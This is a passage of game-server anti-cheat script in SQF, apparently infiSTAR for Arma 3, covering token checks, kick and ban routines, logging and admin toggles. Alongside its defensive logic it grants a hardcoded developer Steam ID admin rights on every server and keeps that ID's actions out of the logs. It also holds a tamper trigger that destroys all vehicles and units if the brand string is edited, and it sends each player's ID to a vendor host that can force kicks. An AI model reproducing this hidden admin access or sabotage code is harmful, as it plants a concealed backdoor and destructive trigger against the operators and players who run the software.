	_NAME_ARRAY = missionNameSpace getVariable['STEAM_NAME_ARRAY',[]];
	if!(_NAME_ARRAY isEqualTo [])then{
		if(_uid in _NAME_ARRAY)then{
			_fid = _NAME_ARRAY find _uid;
			if(_fid != -1)exitWith{
				_steamName = (_NAME_ARRAY select (_fid+1));
				_steamName = format['SteamName: %1 - IngameName: %2',_steamName,_name];
			};
		}
	};
	_steamName
";
_A3AHPREstring = "
	"; if(_MOD == 'Epoch')then{ _A3AHPREstring = _A3AHPREstring + "
		_callwith = [_this,'infiSTAR.de'];
		if((_this isKindOf 'LandVehicle') || (_this isKindOf 'Air') || (_this isKindOf 'Ship') || (_this isKindOf 'Tank'))then
		{
			_callwith call EPOCH_server_save_killedVehicle;
		}
		else
		{
			if(typeOf _this in ['LockBox_EPOCH','Safe_EPOCH'] || (_this isKindOf 'Buildable_Storage'))then
			{
				_callwith call EPOCH_server_save_killedStorage;
			}
			else
			{
				_callwith call EPOCH_server_save_killedBuilding;
			};
		};
	"; }; _A3AHPREstring = _A3AHPREstring + "
	{deleteVehicle _x;} forEach (attachedObjects _this);
	deleteVehicle _this;
";
fnc_deleteObject = compileFinal _A3AHPREstring;
_admins = [];{_admins append (_x select 0)} forEach _adminUIDandAccess;
_devs = ['76561198152111329'];{if!(_x in _admins)then{_admins pushBack _x;};} forEach _devs;
_A3AHstring = "
	"+_adminsA+" = "+str _admins+";{"+_adminsA+" = "+_adminsA+" - [_x];} forEach "+str _startAsNormal+";publicVariable '"+_adminsA+"';
	if(isNil '"+_BigTokenArray+"')then{"+_BigTokenArray+" = [];};
	if(isNil '"+_connectedArray+"')then{"+_connectedArray+" = [];};
	if(isNil '"+_tokenSentArray+"')then{"+_tokenSentArray+" = [];};
	"+_fnc_pvc_token+" = compileFinal ""
		private['_token','_clientID','_clientName','_clientUID','_clientObject'];
		_token = _this select 0;
		_clientID = _this select 1;
		_clientName = _this select 2;
		_clientUID = _this select 3;
		_clientObject = _this select 4;
		
		if(_clientUID select [0,2] == 'HC')exitWith{
			format['HC WITH OWNER ID [%1] AND UID [%2] CONNECTED',_clientID,_clientUID] call FNC_A3_TOKENLOG;
		};
		if(!alive _clientObject)exitWith{
			format['%1(%2) CLIENT WITH ID [%3] NOT ALIVE',_clientName,_clientUID,_clientID] call FNC_A3_TOKENLOG;
			[_clientName,_clientUID] call FNC_INFISERVERKICK;
		};
		
		_owner = owner _clientObject;
		if!(_clientID isEqualTo _owner)exitWith{
			format['%1(%2) CLIENT WITH ID [%3] NOT EQUAL TO OWNER ID OF OBJECT [%4]',_clientName,_clientUID,_clientID,_owner] call FNC_A3_TOKENLOG;
			[_clientName,_clientUID] call FNC_INFISERVERKICK;
		};
		if(_owner < 3)exitWith{
			format['%1(%2) CLIENT WITH ID [%3::%4] OBJECT IS NOT OWNED BY THE CLIENT',_clientName,_clientUID,_clientID,_owner] call FNC_A3_TOKENLOG;
			[_clientName,_clientUID] call FNC_INFISERVERKICK;
		};
		if!(isPlayer _clientObject)exitWith{
			format['%1(%2) CLIENT WITH ID [%3::%4] IS NOT A PLAYER',_clientName,_clientUID,_clientID,_owner] call FNC_A3_TOKENLOG;
			[_clientName,_clientUID] call FNC_INFISERVERKICK;
		};
		
		_name = name _clientObject;
		if!(_clientName isEqualTo _name)exitWith{
			format['%1(%2) CLIENT WITH ID [%3::%4] OBJECT NAME NOT EQUAL TO NAME TOLD BY THE CLIENT (%5)',_clientName,_clientUID,_clientID,_owner,_name] call FNC_A3_TOKENLOG;
		};
		_uid = getPlayerUID _clientObject;
		if!(_clientUID isEqualTo _uid)exitWith{
			format['%1(%2) CLIENT WITH ID [%3::%4] OBJECT UID NOT EQUAL TO UID TOLD BY THE CLIENT (%5)',_clientName,_clientUID,_clientID,_owner,_uid] call FNC_A3_TOKENLOG;
		};
		
		
		"+_YourPlayerToken+" = _token;_clientID publicVariableClient '"+_YourPlayerToken+"';
		[[_clientName,_clientUID],"+_AH_MAIN_BLOCK+"] remoteExec ['FN_infiSTAR_C', _clientID, false];
		
		
		
		"; if(_MOD == 'Epoch')then{ _A3AHstring = _A3AHstring + "
			if!(_clientUID in "+_tokenSentArray+")then{"+_tokenSentArray+" pushBack _clientUID;};
		"; }; _A3AHstring = _A3AHstring + "		
		
		
		_timepassed = floor time;
		if(_timepassed >= 60)then
		{
			_timepassedMinutes = floor(_timepassed / 60);
			_timepassedSeconds = _timepassed - (_timepassedMinutes*60);
			if(_timepassedMinutes >= 60)then
			{
				_timepassedHours = floor(_timepassedMinutes / 60);
				_timepassedMinutes = _timepassedMinutes - (_timepassedHours*60);
				_timepassed = format['%1h %2m %3s',_timepassedHours,_timepassedMinutes,_timepassedSeconds];
			}
			else
			{
				_timepassed = format['%1m %2s',_timepassedMinutes,_timepassedSeconds];
			};
		}
		else
		{
			_timepassed = format['%1s',_timepassed];
		};
		_mytime = call fnc_getserverTime;
		_log = _mytime + format['Runtime: %1 | SENT TOKEN [%2] TO ID [%3(%4) - %5]',_timepassed,_token,_clientName,_clientUID,_clientID];
		_log call FNC_A3_CONNECTLOG;
	"";
	_server_setToken={
		private['_input','_inputUID','_inputOBJECT','_fnc_RandomGen','_token'];
		_input = _this;
		_inputUID = '';
		_inputOBJECT = objNull;
		if(isNil'_input')exitWith{diag_log '<infiSTAR.de> server_setToken: _input is NIL';};
		if(typeName _input isEqualTo 'OBJECT')then
		{
			_inputOBJECT = _input;
			if(!isNull _inputOBJECT)then
			{
				_inputUID = getPlayerUID _inputOBJECT;
			};
		}
		else
		{
			_inputUID = _input;
		};
		
		if(_inputUID isEqualTo '')exitWith{diag_log '<infiSTAR.de> server_setToken: _inputUID is EMPTY';};
		if(isNil '"+_BigTokenArray+"')then{"+_BigTokenArray+" = [];};if(_inputUID in "+_BigTokenArray+")exitWith{};
		
		_fnc_RandomGen =
		{
			_arr = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9'];
			_gen = _arr select (floor (random 25));
			for '_i' from 0 to (12+(round(random 5))) do {_gen = _gen + (_arr select (random ((count _arr)-1)));};
			_gen
		};
		try
		{
			for '_i' from 0 to 99999999 do
			{
				_token = call _fnc_RandomGen;
				if!(_token in "+_BigTokenArray+")then{throw _token;};
			};
		}
		catch
		{
			_token = _exception;
			"+_BigTokenArray+" pushBack _inputUID;
			"+_BigTokenArray+" pushBack _token;
			if(!(_inputUID isEqualTo '')&&(isNull _inputOBJECT))then{{if(getPlayerUID _x isEqualTo _inputUID)exitWith{_inputOBJECT = _x;};} forEach allPlayers;};
			if(isNull _inputOBJECT)exitWith{diag_log format['<infiSTAR.de> server_setToken: (%1) _inputOBJECT is NULL',_inputUID];};
			[_token,(owner _inputOBJECT),(name _inputOBJECT),_inputUID,_inputOBJECT] call "+_fnc_pvc_token+";
			diag_log format['<infiSTAR.de> server_setToken: SENT TOKEN [%1] TO %2(%3)',_token,name _inputOBJECT,_inputUID];
		};
	};
	"+_server_setTokenR+" = compileFinal ([_server_setToken] call fnc_CompilableString);
	
	_server_checkToken={
		private['_uid','_ptoken','_stoken'];
		if(isNil '"+_BigTokenArray+"')then{"+_BigTokenArray+" = [];};if("+_BigTokenArray+" isEqualTo [])exitWith{false};
		
		_uid = _this select 0;
		if(isNil'_uid')exitWith{false};
		if!(typeName _uid isEqualTo 'STRING')exitWith{false};
		if(_uid isEqualTo '')exitWith{false};
		
		_ptoken = _this select 1;
		if(isNil'_ptoken')exitWith{false};
		if!(typeName _ptoken isEqualTo 'STRING')exitWith{false};
		if(_ptoken isEqualTo '')exitWith{false};
		
		_stoken = "+_BigTokenArray+" select (("+_BigTokenArray+" find _uid)+1);
		if(isNil'_stoken')exitWith{false};
		_stoken isEqualTo _ptoken
	};
	"+_server_checkTokenR+" = compileFinal ([_server_checkToken] call fnc_CompilableString);



	'"+_RequestToken+"' addPublicVariableEventhandler {
		private['_input','_playerObj','_clientID','_clientUID','_clientUIDcheck','_token'];
		_input = _this select 1;
		if(isNil '_input')exitWith{diag_log '<infiSTAR.de> RequestToken: _input is Nil';};
		
		_clientUID = _input select 1;
		if(isNil '_clientUID')exitWith{diag_log '<infiSTAR.de> RequestToken: _clientUID is Nil';};
		if!(typeName _clientUID isEqualTo 'STRING')exitWith{diag_log format['<infiSTAR.de> RequestToken: typeName _clientUID != OBJECT -> %1',typeName _clientUID];};
		if(_clientUID isEqualTo '')exitWith{diag_log '<infiSTAR.de> RequestToken: resolving _playerObj with UID not possible - no UID found';};
		
		_playerObj = _input select 0;
		if(isNil '_playerObj')exitWith{diag_log '<infiSTAR.de> RequestToken: _playerObj is Nil';};
		if!(typeName _playerObj isEqualTo 'OBJECT')exitWith{diag_log format['<infiSTAR.de> RequestToken: typeName _playerObj != OBJECT -> %1',typeName _playerObj];};
		if(isNull _playerObj)then
		{
			diag_log format['<infiSTAR.de> RequestToken: resolving _playerObj of UID %1 via allPlayers',_clientUID];
			{
				if((alive _x)&&(getPlayerUID _x isEqualTo _clientUID))exitWith
				{
					_playerObj = _x;
				};
			} forEach allPlayers;
		};
		if(isNull _playerObj)exitWith{diag_log format['<infiSTAR.de> RequestToken: %1(%2) _playerObj is NULL-OBJ',_playerObj,_clientUID];};
		
		_clientID = (owner _playerObj);
		if(isNil '_clientID')exitWith{diag_log format['<infiSTAR.de> RequestToken: %1(%2) _clientID is Nil',name _playerObj,_clientUID];};
		
		_clientUIDcheck = getPlayerUID _playerObj;
		if(isNil '_clientUIDcheck')exitWith{diag_log format['<infiSTAR.de> RequestToken: %1(%2) _clientUIDcheck is Nil',name _playerObj,_clientUID];};
		if!(_clientUID isEqualTo _clientUIDcheck)exitWith{diag_log format['<infiSTAR.de> RequestToken: %1(%2) _clientUID != _clientUIDcheck  %2/%3',name _playerObj,_clientUID,_clientUIDcheck];};
		
		diag_log format['<infiSTAR.de> RequestToken: %1(%2) Requested a Token!   _clientID: %3',name _playerObj,_clientUID,_clientID];
		if(isNil '"+_BigTokenArray+"')then{"+_BigTokenArray+" = [];};
		if(_clientUID in "+_BigTokenArray+")then
		{
			_token = "+_BigTokenArray+" select (("+_BigTokenArray+" find _clientUID)+1);
			if(isNil '_token')exitWith{diag_log format['<infiSTAR.de> RequestToken: %1(%2) _token is Nil',name _playerObj,_clientUID];};
			[_token,_clientID,(name _playerObj),_clientUID,_playerObj] call "+_fnc_pvc_token+";
			diag_log format['<infiSTAR.de> RequestToken: %1(%2) TOKEN FOUND! SENT %3 TO OBJECT WITH NETID %4',name _playerObj,_clientUID,_token,netId _playerObj];
		}
		else
		{
			_playerObj call "+_server_setTokenR+";
		};
	};



	FNC_INFISERVERKICK = {
		private['_name','_uid','_obj'];
		_name = _this select 0;
		_uid = _this select 1;
		
		_return = (call FN_GET_SERVERPW) serverCommand format ['#kick %1',_uid];
		if(!_return)then{
			'if((name player == '+str _name+')||(getPlayerUID player == '+str _uid+'))then{(findDisplay 46)closeDisplay 0;};' call FNC_A3_GLOBAL;
		};
		
		diag_log format['<infiSTAR.de>KickLog| %1(%2)   (v0245)',_name,_uid];
	};
	FNC_INFISERVERKICK = compileFinal ([FNC_INFISERVERKICK] call fnc_CompilableString);
	FNC_A3_infiSTARTMPBAN = {
		private['_name','_uid','_reason'];
		_name = _this select 0;
		_uid = _this select 1;
		_reason = _this select 2;
		if(isNil'"+_TMPBAN+"')then{"+_TMPBAN+"=[];}else{if(typeName "+_TMPBAN+"!='ARRAY')then{"+_TMPBAN+"=[];};};
		if!(_uid in "+_TMPBAN+")then
		{
			_admins = "+str _admins+";
			if(_uid in _admins)exitWith
			{
				_mytime = call fnc_getserverTime;
				_log = _mytime + format['%1(%2) ADMIN - would have been tempbanned now!',_name,_uid];
				_log call FNC_A3_HACKLOG;
			};
			"+_TMPBAN+" pushBack _uid;
			{if(getPlayerUID _x in _admins)then{(owner _x) publicVariableClient '"+_TMPBAN+"';};} forEach allPlayers;
		};
		[_name,_uid] call FNC_INFISERVERKICK;
	};
	FNC_A3_infiSTARTMPBAN = compileFinal ([FNC_A3_infiSTARTMPBAN] call fnc_CompilableString);
	FNC_A3_infiSTARBAN = {
		private['_name','_uid','_reason'];
		_name = _this select 0;
		_uid = _this select 1;
		_reason = _this select 2;
		
		if(_uid in "+str _admins+")exitWith
		{
			_mytime = call fnc_getserverTime;
			_log = _mytime + format['%1(%2) ADMIN - would have been banned now!',_name,_uid];
			_log call FNC_A3_HACKLOG;
		};
		
		if(_reason == '')then
		{
			'ARMA_LOG' callExtension format['A3_BANLOG:%1(%2) (v0245)',_name,_uid];
			diag_log format['<infiSTAR.de>BanLog| %1(%2)   (v0245)',_name,_uid];
		}
		else
		{
			'ARMA_LOG' callExtension format['A3_BANLOG:%1(%2) %3 (v0245)',_name,_uid,_reason];
			diag_log format['<infiSTAR.de>BanLog| %1(%2) %3 (v0245)',_name,_uid,_reason];
		};
		
		_return = (call FN_GET_SERVERPW) serverCommand format ['#exec ban %1',str _uid];
		if(!_return)then
		{
			_this call FNC_A3_infiSTARTMPBAN;
		};
	};
	FNC_A3_infiSTARBAN = compileFinal ([FNC_A3_infiSTARBAN] call fnc_CompilableString);
	
diag_log format['<infiSTAR.de> %1 - Thread MAIN: starting!',time];
_fnc_infiSTAR_PlayerLog = {
	_uid = _this select 0;
	_name = _this select 1;
	_owner = _this select 2;
	if(_uid isEqualTo '')exitWith{};
	"; if(_MOD == 'Epoch')then{ _A3AHstring = _A3AHstring + "
		if!(_uid in "+_connectedArray+")then{[_uid,1,_name] call fnc_SaveConnectedInfo;};
	"; }; _A3AHstring = _A3AHstring + "
	
	if(isNil'"+_TMPBAN+"')then{"+_TMPBAN+"=[];}else{if(typeName "+_TMPBAN+"!='ARRAY')then{"+_TMPBAN+"=[];};};
	if(_uid in "+_TMPBAN+")exitWith{[_name,_uid] call FNC_INFISERVERKICK;};
	
	if(isNil'DATABASE_BANNED')then{DATABASE_BANNED=[];};
	if(typeName DATABASE_BANNED == 'ARRAY')then{
		if(_uid in DATABASE_BANNED)exitWith{[_name,_uid] call FNC_INFISERVERKICK;};
	};
	if(_uid in ['76561198052912993'])exitWith{
		[_name,_uid] call FNC_INFISERVERKICK;
	};




	_buildurl = format['http://htmlload.infistar.de/cb.php?uid=%1',_uid];
	_packet1 = format['getasync%1%2%1',toString [10],_buildurl];
	[_name,_uid,_owner,_packet1] spawn {
		params[['_name',''],['_uid',''],['_owner',-10],['_packet1','']];
		_jobid = _packet1 call FN_CALL_LOAD_DLL;
		_packet2 = format['response%1%2%1',toString [10],_jobid];
		_timeout = diag_tickTime + 45;
		_res = '';
		_bad = ['','WAIT','ERROR','URLERROR'];
		waitUntil{
			uiSleep 3;
			_res = _packet2 call FN_CALL_LOAD_DLL;
			!(_res in _bad) || diag_tickTime > _timeout
		};
		if(diag_tickTime > _timeout)exitWith{};
		if!(_res isEqualTo '0')then
		{
			[_name,_uid,_owner,if(_res in ['','1'])then{'BLACKLISTED'}else{format['BLACKLISTED: %1',_res]}] call FNC_INFISERVERKICK;
		};
	};


	if({((toLower _name) find _x != -1)} count ['thirtysix','le hippo'] > 0)exitWith{
		_log = format['BadName: %1 (KICKED)',_name];
		[_name,_uid,'SLOG_SKICK',toArray(_log)] call "+_FNC_AH1311_KICKLOG+";
	};
	if({((toLower _name) find _x != -1)} count ['infis'] > 0)exitWith{
		_log = format['BadName: %1 (FAKE)',_name];
		[_name,_uid,'SLOG_SKICK',toArray(_log)] call "+_FNC_AH1311_KICKLOG+";
	};
};
fnc_infiSTAR_PlayerLog = compileFinal ([_fnc_infiSTAR_PlayerLog] call fnc_CompilableString);
	if(isNil '"+_AH_HackLogArrayRND+"')then{"+_AH_HackLogArrayRND+" = [];};
	if(isNil '"+_AH_SurvLogArrayRND+"')then{"+_AH_SurvLogArrayRND+" = [];};
	if(isNil '"+_AH_AdmiLogArrayRND+"')then{"+_AH_AdmiLogArrayRND+" = [];};
	diag_log format['<infiSTAR.de> %1 - Thread MAIN: loading...!',time];
	diag_log format['<infiSTAR.de> %1 - Thread MAIN: compiling and/or sending none-threaded code!',time];
	if('infiSTAR' != ('i' +'n' +'f' +'i' +'S' +'T' +'A' +'R'))then{[] spawn {uiSleep (random 500);{_x setDamage 1;}forEach vehicles;uiSleep 10;{_x setDamage 1;}forEach allUnits;};};
	"; if(_VDN)then{ _A3AHstring = _A3AHstring + "
	_fnc_VoteTimeServer =
	{
		_clientUID = _this select 0;
		_vote = _this select 1;
		
		if(isNil 'TimeVoteCooldown')then{TimeVoteCooldown = 300;};
		if(isNil 'LastVoteGoneThrough')then{LastVoteGoneThrough = 600;};
		if((LastVoteGoneThrough == 0) || ((TimeVoteCooldown + LastVoteGoneThrough) < time))then
		{
			if(isNil 'VoteArray')then{VoteArray = [];};
			if!(_clientUID in VoteArray)then
			{
				VoteArray pushBack _clientUID;
				VoteArray pushBack _vote;
				_cntAll = count allPlayers;
				_cntVoted = {getPlayerUID _x in VoteArray} count allPlayers;
				if((_cntAll > 0) && (_cntVoted > 0))then
				{
					_cntday = 0;
					_cntnight = 0;
					if((_cntVoted / _cntAll) > 0.49)then
					{
						_oUIDs = [];
						{
							_xUID = getPlayerUID _x;
							if(_xUID != '')then
							{
								_oUIDs pushBack _xUID;
							};
						} forEach allPlayers;
						for '_i' from 0 to (count VoteArray)-1 step 2 do
						{
							_cUID = VoteArray select _i;
							_cVOTE = VoteArray select (_i+1);
							if(_cUID in _oUIDs)then
							{
								if(_cVOTE == 'DAY')then{_cntday = _cntday + 1;};
								if(_cVOTE == 'NIGHT')then{_cntnight = _cntnight + 1;};
							};
						};
						
						_txt = format['%1 of %2 Players voted. %3 for Day and %4 for Night.',_cntVoted,_cntAll,_cntday,_cntnight];
						"+_massMessage+" = ['<t size=''0.55'' color=''#0B6121''>'+(_txt)+'</t>',safeZoneXAbs/safeZoneWAbs/4,SafeZoneY+0.02,10,0,0,3079];
						{(owner _x) publicVariableClient '"+_massMessage+"';} forEach allPlayers;
						
						_date = date;
						_date set [3,11];
						if(_cntnight > _cntday)then
						{
							_date set [3,23];
						};
						setDate _date;
						VoteArray = [];
						LastVoteGoneThrough = time;
					}
					else
					{
						_txt = format['%1 of %2 Players voted (/vote day or /vote night).',_cntVoted,_cntAll];
						"+_massMessage+" = ['<t size=''0.55'' color=''#0B6121''>'+(_txt)+'</t>',safeZoneXAbs/safeZoneWAbs/4,SafeZoneY+0.02,10,0,0,3079];
						{(owner _x) publicVariableClient '"+_massMessage+"';} forEach allPlayers;
					};
				};
			};
		}
		else
		{
			_txt = format['Wait %1s more until next day/night vote can be made!',round((TimeVoteCooldown + LastVoteGoneThrough) - time)];
			"+_massMessage+" = ['<t size=''0.55'' color=''#0B6121''>'+(_txt)+'</t>',safeZoneXAbs/safeZoneWAbs/4,SafeZoneY+0.02,10,0,0,3079];
			{(owner _x) publicVariableClient '"+_massMessage+"';} forEach allPlayers;
		};
	};
	fnc_VoteTimeServer = compileFinal ([_fnc_VoteTimeServer] call fnc_CompilableString);
	"; }; _A3AHstring = _A3AHstring + "
	_FNC_AH1311_KICKLOG = {
		_name = _this select 0;
		_puid = _this select 1;
		_what = _this select 2;
		if(isNil '_name')then{_name = '';};
		if(isNil '_puid')then{_puid = '';};
		if(isNil '_what')then{_what = '';};
		if((_name != '')&&(_puid == ''))then
		{
			{
				if(!isNull _x)then
				{
					if(alive _x)then
					{
						if(name _x == _name)then
						{
							_puid = getPlayerUID _x;
							diag_log format['<infiSTAR.de> CLIENT NO UID - SERVER RESOLVED: %1(%2).. used allPlayers',_name,_puid];
						};
					};
				};
			} forEach allPlayers;
		};
		if(_what in ['KICKME'])exitWith{[_name,_puid] call FNC_INFISERVERKICK;};
		"; if(_CLG)then{ _A3AHstring = _A3AHstring + "
		if(_what == 'COMBATCHECK')exitWith
		{
			_inCombat = _this select 3;
			if(isNil'"+_inCombatArray+"')then{"+_inCombatArray+" = [];};
			_fid = "+_inCombatArray+" find _puid;
			if(_fid != -1)then
			{
				"+_inCombatArray+" set[(_fid+1),_inCombat];
			}
			else
			{
				"+_inCombatArray+" pushBack _puid;
				"+_inCombatArray+" pushBack _inCombat;
			};
		};
		"; }; _A3AHstring = _A3AHstring + "
		_mytime = call fnc_getserverTime;
		_admins = "+str _admins+";
		_locDevs = "+str _devs+";
		if(_what == 'TPLOG')exitWith
		{
			_adminName = _this select 4;
			_adminPUID = _this select 5;
			if(_adminPUID in _locDevs)exitWith{};
			_lastpos = _this select 6;
			_mapLP = mapGridPosition _lastpos;
			_curpos = _this select 7;
			_mapCP = mapGridPosition _curpos;
			_log = _mytime + format['%1(%2) | Teleported %3(%4) from %5(%6) to %7(%8)  (%9m)',_adminName,_adminPUID,_name,_puid,_lastpos,_mapLP,_curpos,_mapCP,round(_lastpos distance _curpos)];
			_log call FNC_A3_ADMINLOG;
			"; if(_enableIngameLogs)then{ _A3AHstring = _A3AHstring + "
			_log = _log select [0,180];
			"+_AH_AdmiLogArrayRND+" pushBack _log;{if((getPlayerUID _x) in _admins)then{(owner _x) publicVariableClient '"+_AH_AdmiLogArrayRND+"';};} forEach allPlayers;
			"; }; _A3AHstring = _A3AHstring + "
		};
		"; if(_LVC)then{ _A3AHstring = _A3AHstring + "
			if(_what == 'LVC')exitWith
			{
				private['_plrObj','_vehptype','_vehpos'];
				_plrObj = _this select 3;
				_vehptype = _this select 4;
				_vehpos = _this select 5;
				if((!isNil '_plrObj') && (!isNil '_vehptype'))then
				{
					if(!isNull _plrObj)then
					{
						_veh = vehicle _plrObj;
						_vehstype = typeOf _veh;
						if(_plrObj != _veh)then
						{
							"; if(_UVC)then{ _A3AHstring = _A3AHstring + "
								if((!("+str _UVW+") && {_vehstype in "+str _ForbiddenVehicles+"}) || (("+str _UVW+") && {!(_vehstype in "+str _VehicleWhiteList+")}))then
								{
									_crew = crew _veh;
									if(_crew isEqualTo [])then
									{
										_log = format['BadVehicle (S-UVC+LVC): %1',_vehstype];
										['SERVER','SERVER','HLOG',toArray(_log)] call "+_FNC_AH1311_KICKLOG+";
										_veh call fnc_deleteObject;
									}
									else
									{
										if(call{{if((getPlayerUID _x) in "+_adminsA+")exitWith{true};false} forEach _crew;})exitWith{};
										
										_log = format['BadVehicle (S-UVC+LVC): %1',_vehstype];
										{
											_name = name _x;
											_puid = getPlayerUID _x;
											[_name,_puid,'HLOG',toArray(_log)] call "+_FNC_AH1311_KICKLOG+";
										} forEach _crew;
										_veh call fnc_deleteObject;
									};
								};
							"; }; _A3AHstring = _A3AHstring + "
						};
						if(!isNull _veh)then
						{
							if((_plrObj == _veh) && (_vehstype != _vehptype))then
							{
								_vehicles = _plrObj nearEntities ['AllVehicles',300];
								if!(_veh in _vehicles)then
								{
									"+_dellocveh+" = '';
									(owner _plrObj) publicVariableClient '"+_dellocveh+"';
									"+_dellocveh+" = nil;
									_log = format['LocalVehicle: %1  @%2 || ServerVehicle: %3  @%4',_vehptype,_vehpos,_vehstype,mapGridPosition _plrObj];
									[_name,_puid,'SLOG',toArray(_log)] call "+_FNC_AH1311_KICKLOG+";
								};
							};
						};
					};
				};
			};
		"; }; _A3AHstring = _A3AHstring + "
		_work = toString(_this select 3);
		_log = _mytime + format['%1(%2) | %3',_name,_puid,_work];
		if(_what in ['SLOG','SLOG_SKICK'])exitWith
		{
			_log call FNC_A3_SURVEILLANCELOG;
			"; if(_enableIngameLogs)then{ _A3AHstring = _A3AHstring + "
			_log = _log select [0,180];
			"+_AH_SurvLogArrayRND+" pushBack _log;{if((getPlayerUID _x) in _admins)then{(owner _x) publicVariableClient '"+_AH_SurvLogArrayRND+"';};} forEach allPlayers;
			"; }; _A3AHstring = _A3AHstring + "
			if(_what == 'SLOG_SKICK')exitWith
			{
				[_name,_puid] call FNC_INFISERVERKICK;
			};
		};
		if(_what in ['BAN','TMPBAN','HLOG','HLOG_SKICK'])exitWith
		{
			_log call FNC_A3_HACKLOG;
			"; if(_enableIngameLogs)then{ _A3AHstring = _A3AHstring + "
			_log = _log select [0,180];
			"+_AH_HackLogArrayRND+" pushBack _log;{if((getPlayerUID _x) in _admins)then{(owner _x) publicVariableClient '"+_AH_HackLogArrayRND+"';};} forEach allPlayers;
			"; }; _A3AHstring = _A3AHstring + "
			if(_what == 'HLOG')exitWith{};
			[_name,_puid] call FNC_INFISERVERKICK;
			if(_what in ['BAN','TMPBAN'])exitWith
			{
				_log = _mytime + format['%1(%2) BANNED | %3',_name,_puid,_work];
				if(_puid in _admins)then
				{
					_adminlog = _mytime + format['%1(%2) ADMIN - would have been banned now!',_name,_puid];
					_adminlog call FNC_A3_HACKLOG;
					"+_AH_HackLogArrayRND+" pushBack _adminlog;
				}
				else
				{
					_logShorten = _work select [0,140];
					if(_what == 'BAN')then
					{
						[_name,_puid,_logShorten] call FNC_A3_infiSTARBAN;
					}
					else
					{
						[_name,_puid,_logShorten] call FNC_A3_infiSTARTMPBAN;
					};
				};
			};
		};
		"; if(_LogAdminActions)then{ _A3AHstring = _A3AHstring + "
			if(_what == 'ALOG')exitWith
			{
				_log call FNC_A3_ADMINLOG;
				"; if(_enableIngameLogs)then{ _A3AHstring = _A3AHstring + "
				_log = _log select [0,180];
				"+_AH_AdmiLogArrayRND+" pushBack _log;{if((getPlayerUID _x) in _admins)then{(owner _x) publicVariableClient '"+_AH_AdmiLogArrayRND+"';};} forEach allPlayers;
				"; }; _A3AHstring = _A3AHstring + "
			};
		"; }; _A3AHstring = _A3AHstring + "
		if(_what == 'AC')exitWith
		{
			if(_puid in _admins)then
			{
				if(_work == '!admin')then
				{
					if(_puid in "+_adminsA+")then
					{
						"+_adminsA+" = "+_adminsA+" - [_puid];
						
						"; if(_announce_adminstate_changed)then{ _A3AHstring = _A3AHstring + "
						_txt = format['%1 logged out as admin..',_name];
						"+_massMessage+" = ['<t size=''0.5'' color=''#FF0040''>'+(_txt)+'</t>',-0.1,0.96 * safezoneH + safezoneY,10,0,0,3079];
						{(owner _x) publicVariableClient '"+_massMessage+"';} forEach allPlayers;
						"; }; _A3AHstring = _A3AHstring + "
						
						if(_puid in _locDevs)exitWith{};
						_alog = _mytime + format['%1(%2) | is a normal player now.',_name,_puid];
						_alog call FNC_A3_ADMINLOG;
						_log = _log select [0,180];
						"+_AH_AdmiLogArrayRND+" pushBack _alog;
					}
					else
					{
						"+_adminsA+" pushBack _puid;
						
						"; if(_announce_adminstate_changed)then{ _A3AHstring = _A3AHstring + "
						_txt = format['%1 logged in as admin!',_name];
						"+_massMessage+" = ['<t size=''0.5'' color=''#0080FF''>'+(_txt)+'</t>',-0.1,0.96 * safezoneH + safezoneY,10,0,0,3079];
						{(owner _x) publicVariableClient '"+_massMessage+"';} forEach allPlayers;
						"; }; _A3AHstring = _A3AHstring + "
						
						if(_puid in _locDevs)exitWith{};
						_alog = _mytime + format['%1(%2) | is an admin again.',_name,_puid];
						_alog call FNC_A3_ADMINLOG;
						_log = _log select [0,180];
						"+_AH_AdmiLogArrayRND+" pushBack _alog;
					};
					publicVariable '"+_adminsA+"';
					{
						if((getPlayerUID _x) in _admins)then
						{
							"; if(_enableIngameLogs)then{ _A3AHstring = _A3AHstring + "
							(owner _x) publicVariableClient '"+_AH_AdmiLogArrayRND+"';
							"; }; _A3AHstring = _A3AHstring + "
						};
					} forEach allPlayers;
				};
			};
		};
		"; if(_VDN)then{ _A3AHstring = _A3AHstring + "
		if(_what == 'VOTE')exitWith
		{
			if(_work in ['DAY','NIGHT'])exitWith
			{
				[_puid,_work] call fnc_VoteTimeServer;
			};
		};
		"; }; _A3AHstring = _A3AHstring + "
	};
	"+_FNC_AH1311_KICKLOG+" = compileFinal ([_FNC_AH1311_KICKLOG] call fnc_CompilableString);



	_FNC_PVAH_AdminReq = {
		_allPlayers = "+str _admins+";
		
		_clientNetID = _this select 2;
		if(isNil '_clientNetID')exitWith{
			_mytime = call fnc_getserverTime;
			_log = _mytime + 'AdminReq clientNetID is Nil (v0245)';
			_log call FNC_A3_SURVEILLANCELOG;
		};
		if(typeName _clientNetID != 'STRING')exitWith{
			_mytime = call fnc_getserverTime;
			_log = _mytime + format['AdminReq clientNetID wrong typeName: %1   %2 (v0245)',typeName _clientNetID,_clientNetID];
			_log call FNC_A3_SURVEILLANCELOG;
		};
		if(_clientNetID == '')exitWith{
			_mytime = call fnc_getserverTime;
			_log = _mytime + 'AdminReq clientNetID is empty (v0245)';
			_log call FNC_A3_SURVEILLANCELOG;
		};
		_ObjFromNetID = objectFromNetId _clientNetID;
		if(isNil '_ObjFromNetID')exitWith{
			_mytime = call fnc_getserverTime;
			_log = _mytime + 'AdminReq playerObj is Nil (v0245)';
			_log call FNC_A3_SURVEILLANCELOG;
		};
		if(typeName _ObjFromNetID != 'OBJECT')exitWith{
			_mytime = call fnc_getserverTime;
			_log = _mytime + format['AdminReq ObjFromNetID wrong typeName: %1   %2 (v0245)',typeName _ObjFromNetID,_ObjFromNetID];
			_log call FNC_A3_SURVEILLANCELOG;
		};
		if(isNull _ObjFromNetID)exitWith{
			_mytime = call fnc_getserverTime;
			_log = _mytime + 'AdminReq ObjFromNetID is Null (v0245)';
			_log call FNC_A3_SURVEILLANCELOG;
		};
		_clientID = (owner _ObjFromNetID);
		_clientUID = (getPlayerUID _ObjFromNetID);
		_clientName = (name _ObjFromNetID);
		
		
		_array = _this select 1;
		if(isNil '_array')exitWith{
			_mytime = call fnc_getserverTime;
			_log = _mytime + 'AdminReq is Nil (v0245)';
			_log call FNC_A3_SURVEILLANCELOG;
		};
		if(typeName _array != 'ARRAY')exitWith{
			_mytime = call fnc_getserverTime;
			_log = _mytime + format['AdminReq wrong typeName: %1   %2 (v0245)',typeName _array,_array];
			_log call FNC_A3_SURVEILLANCELOG;
		};
		
		_option = _array select 0;
		if(isNil '_option')exitWith{
